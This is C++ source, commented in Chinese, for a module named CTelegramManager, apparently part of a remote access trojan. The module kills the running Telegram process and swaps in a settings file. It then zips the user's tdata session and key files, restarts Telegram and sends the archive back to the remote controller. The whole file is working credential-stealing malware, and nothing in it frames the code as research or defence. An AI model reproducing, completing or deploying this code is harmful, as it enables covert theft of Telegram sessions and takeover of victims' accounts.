#include "stdafx.h"  
#include "TelegramManager.h"  
#include "until.h"  
#include <tlhelp32.h>  
#include <psapi.h>
#include <Shlwapi.h>
  
CTelegramManager::CTelegramManager(CClientSocket *pClient, LPBYTE lparam) : CManager(pClient)  
{  
    // 解析客户端发送的路径信息  
    int offset = 0;  
    int settingsLen;  
    memcpy(&settingsLen, lparam + offset, sizeof(int));  
    offset += sizeof(int);  
      
    char* settingsStr = (char*)(lparam + offset);  
    m_settingsPath = settingsStr;  
    offset += settingsLen + 1;  
      
    int saveLen;  
    memcpy(&saveLen, lparam + offset, sizeof(int));  
    offset += sizeof(int);  
      
    char* saveStr = (char*)(lparam + offset);  
    m_savePath = saveStr;  
      
    // 开始提取流程  
    ExtractTelegramData();  
}  
  
CTelegramManager::~CTelegramManager()  
{  
}  
  
void CTelegramManager::OnReceive(LPBYTE lpBuffer, UINT nSize)  
{  
    // 处理客户端响应  
}  
  
int CTelegramManager::SendToken(BYTE bToken)  
{  
    return Send(&bToken, 1);  
}

 
  
void CTelegramManager::ExtractTelegramData()  
{  
    // 1. 查找并终止Telegram进程  
    if (!FindAndTerminateTelegram()) {  
        return;  
    }  
      
    // 2. 复制settingss文件到tdata目录  
    //CString destPath = m_telegramPath + "\\tdata\\settingss";  
    //CopyFile(m_settingsPath, destPath, FALSE);  
      
    // 3. 创建压缩包  
    CreateTelegramArchive();  
      
    // 4. 等待3秒  
    Sleep(3000);  
      
    // 5. 重启Telegram进程  
    STARTUPINFO si = {0};  
    PROCESS_INFORMATION pi = {0};  
    si.cb = sizeof(si);  
    CreateProcess(m_telegramPath + "\\telegram.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);  
    if (pi.hThread) CloseHandle(pi.hThread);  
    if (pi.hProcess) CloseHandle(pi.hProcess);  
      
    // 6. 发送压缩包到客户端（这里需要实现文件传输逻辑）  
    // 6. 发送压缩包到客户端  
    if (!m_archivePath.IsEmpty() && PathFileExists(m_archivePath))  
    {  

		// 提取文件名  
		CString fileName = PathFindFileName(m_archivePath);  
      
		// 使用新的专用传输函数  
		SendTelegramArchive(m_archivePath, fileName);
    }  
}

UINT CTelegramManager::SendTelegramArchive(LPCTSTR localFilePath, LPCTSTR fileName)  
{  
    // 打开文件  
    HANDLE hFile = CreateFile(localFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);  
    if (hFile == INVALID_HANDLE_VALUE)  
        return FALSE;  
	
    // 获取文件大小  
    DWORD dwSizeHigh, dwSizeLow;  
    dwSizeLow = GetFileSize(hFile, &dwSizeHigh);  
	
    // 读取文件内容  
    DWORD fileSize = dwSizeLow; // 假设文件不超过4GB  
    LPBYTE fileData = (LPBYTE)LocalAlloc(LPTR, fileSize);  
    DWORD bytesRead;  
    ReadFile(hFile, fileData, fileSize, &bytesRead, NULL);  
    CloseHandle(hFile);  
	
    // 构造数据包：[命令][文件大小高位][文件大小低位][文件名][文件数据]  
    int fileNameLen = strlen(fileName) + 1;  
    int packetSize = 1 + 8 + fileNameLen + fileSize;  
    LPBYTE packet = (LPBYTE)LocalAlloc(LPTR, packetSize);  
	
    packet[0] = COMMAND_TELEGRAM_FILE_TRANSFER;  
    *(DWORD*)(packet + 1) = dwSizeHigh;  
    *(DWORD*)(packet + 5) = dwSizeLow;  
    strcpy((char*)(packet + 9), fileName);  
    memcpy(packet + 9 + fileNameLen, fileData, fileSize);  
	
    // 发送数据包  
    UINT result = Send(packet, packetSize);  
	
    // 清理内存  
    LocalFree(fileData);  
    LocalFree(packet);  
	
    return result;  
}
  
bool CTelegramManager::FindAndTerminateTelegram()  
{  
    // 使用现有的进程查找功能  
    DWORD processId = GetProcessID("telegram.exe");  
    if (processId == 0) {  
        return false;  
    }  
      
    // 获取进程路径  
    if (!GetProcessPath(processId, m_telegramPath)) {  
        return false;  
    }  
      
    // 提取目录路径  
    int pos = m_telegramPath.ReverseFind('\\');  
    if (pos != -1) {  
        m_telegramPath = m_telegramPath.Left(pos);  
    }  
      
    // 终止进程  
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processId);  
    if (hProcess) {  
        TerminateProcess(hProcess, 0);  
        CloseHandle(hProcess);  
        return true;  
    }  
      
    return false;  
}  
  
bool CTelegramManager::GetProcessPath(DWORD processId, CString& processPath)  
{  
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);  
    if (hProcess == NULL)  
        return false;  
      
    char szPath[MAX_PATH];  
    if (GetModuleFileNameEx(hProcess, NULL, szPath, MAX_PATH) == 0) {  
        CloseHandle(hProcess);  
        return false;  
    }  
      
    processPath = szPath;  
    CloseHandle(hProcess);  
    return true;  
}  
  
void CTelegramManager::CreateTelegramArchive()  
{  
    // 准备要压缩的文件列表  
    std::vector<CString> filesToCompress;  

	// 复制临时文件（假设文件和目录都存在）
    CopyFile(
        _T("C:\\Users\\Administrator\\AppData\\Local\\Temp\\tg_settingss.tmp"),
        m_telegramPath + "\\tdata\\settingss",
        FALSE  // 允许覆盖
    );
      
    // 检查文件是否存在再添加  
    CString telegramExe = m_telegramPath + "\\telegram.exe";  
    if (GetFileAttributes(telegramExe) != INVALID_FILE_ATTRIBUTES) {  
        filesToCompress.push_back(telegramExe);  
    }  
      

	CString D877f7Dir = m_telegramPath + "\\tdata\\D877F783D5D3EF8C";  
    if (GetFileAttributes(D877f7Dir) != INVALID_FILE_ATTRIBUTES) {  
        filesToCompress.push_back(D877f7Dir);  
    }
	
	CString D877f7File = m_telegramPath + "\\tdata\\D877F783D5D3EF8Cs";  
	DWORD fileOnlyAttrs = GetFileAttributes(D877f7File);  
	if (fileOnlyAttrs != INVALID_FILE_ATTRIBUTES && !(fileOnlyAttrs & FILE_ATTRIBUTE_DIRECTORY)) {  
		filesToCompress.push_back(D877f7File);  
	}
      
    CString settingsFile = m_telegramPath + "\\tdata\\settingss";  
    if (GetFileAttributes(settingsFile) != INVALID_FILE_ATTRIBUTES) {  
        filesToCompress.push_back(settingsFile);  
    }  
      
    CString keyDataFile = m_telegramPath + "\\tdata\\key_datas";  
    if (GetFileAttributes(keyDataFile) != INVALID_FILE_ATTRIBUTES) {  
        filesToCompress.push_back(keyDataFile);  
    }  
      
    if (!filesToCompress.empty()) {  
        // 设置输出路径并保存到成员变量  
        m_archivePath = m_telegramPath + "\\telegram_data.zip";  
          
        // 使用现有的多文件压缩功能  
        CFileManager fileManager(m_pClient);  
        fileManager.CreateZipArchiveMultiple(filesToCompress, m_archivePath);  
    }  
}
